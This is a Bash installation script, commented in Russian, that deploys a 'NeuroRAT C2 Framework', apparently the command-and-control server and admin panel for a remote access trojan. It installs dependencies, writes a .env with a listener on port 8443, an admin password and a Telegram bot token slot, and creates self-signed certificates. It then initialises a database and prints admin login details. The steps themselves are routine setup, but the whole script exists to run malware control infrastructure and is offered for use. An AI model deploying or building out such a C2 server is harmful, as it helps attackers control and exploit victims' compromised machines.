#!/bin/bash
# NeuroRAT C2 Framework - Скрипт развертывания
# Автор: iamtomasanderson@gmail.com
# GitHub: https://github.com/Personaz1

set -e

echo "██╗  ██╗███████╗██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ████████╗"
echo "███╗ ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝"
echo "█╔██╗██║█████╗  ██║   ██║██████╔╝██║   ██║██████╔╝███████║   ██║   "
echo "██╔██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   "
echo "██║╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║   ██║   "
echo "╚═╝ ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo "Установка C2 Framework начата..."

# Проверка наличия Python
if ! command -v python3 &> /dev/null; then
    echo "Python3 не найден. Установка..."
    sudo apt-get update
    sudo apt-get install -y python3 python3-pip python3-venv
fi

# Проверка наличия Node.js для admin-panel
if ! command -v node &> /dev/null; then
    echo "Node.js не найден. Установка..."
    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
    sudo apt-get install -y nodejs
fi

# Создание виртуального окружения Python
echo "Создание виртуального окружения Python..."
python3 -m venv venv
source venv/bin/activate

# Установка зависимостей Python
echo "Установка зависимостей Python..."
pip install --upgrade pip
pip install -r requirements.txt

# Установка зависимостей для admin-panel
echo "Установка зависимостей для панели администратора..."
cd admin-panel
npm install
npm run build
cd ..

# Настройка конфигурации
echo "Настройка конфигурации..."
if [ ! -f ".env" ]; then
    echo "Создание файла .env с настройками по умолчанию..."
    cat > .env <<EOL
SERVER_HOST=0.0.0.0
SERVER_PORT=8443
SECRET_KEY=$(openssl rand -hex 32)
DEBUG=False
DATABASE_URL=sqlite:///neurorat.db
ADMIN_USERNAME=admin
ADMIN_PASSWORD=$(openssl rand -hex 8)
TELEGRAM_BOT_TOKEN=
SSL_CERT=./certs/cert.pem
SSL_KEY=./certs/key.pem
EOL
    echo "ВНИМАНИЕ: Сгенерирован случайный пароль администратора. Проверьте файл .env!"
fi

# Создание самоподписанного SSL-сертификата, если его нет
if [ ! -d "certs" ]; then
    echo "Создание самоподписанных SSL-сертификатов..."
    mkdir -p certs
    openssl req -x509 -newkey rsa:4096 -nodes -out certs/cert.pem -keyout certs/key.pem -days 365 -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
fi

# Инициализация базы данных
echo "Инициализация базы данных..."
python3 setup_database.py

# Настройка прав доступа
echo "Настройка прав доступа..."
chmod +x start.sh

echo "Развертывание NeuroRAT C2 Framework завершено!"
echo "Для запуска сервера выполните: ./start.sh"
echo "Информация для входа в панель администратора:"
echo "URL: https://$(hostname -I | awk '{print $1}'):8443/admin"
echo "Логин: admin"
echo "Пароль: $(grep ADMIN_PASSWORD .env | cut -d= -f2)"